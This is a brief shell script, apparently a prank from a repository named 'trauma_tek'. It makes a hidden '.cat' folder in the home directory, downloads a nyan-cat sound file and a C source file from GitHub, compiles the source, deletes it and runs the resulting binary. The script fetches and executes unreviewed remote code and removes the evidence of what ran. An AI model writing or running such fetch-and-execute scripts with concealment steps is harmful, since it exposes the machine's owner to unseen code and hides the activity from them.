cd $HOME
mkdir ".cat"
cd ".cat"
wget 'https://github.com/LeoBaldachino/trauma_tek/raw/main/nyanCat.wav'
wget 'https://raw.githubusercontent.com/LeoBaldachino/trauma_tek/main/WTF_am_I_doing.c'
gcc WTF_am_I_doing.c -lcsfml-audio
rm WTF_am_I_doing.c
./a.out oui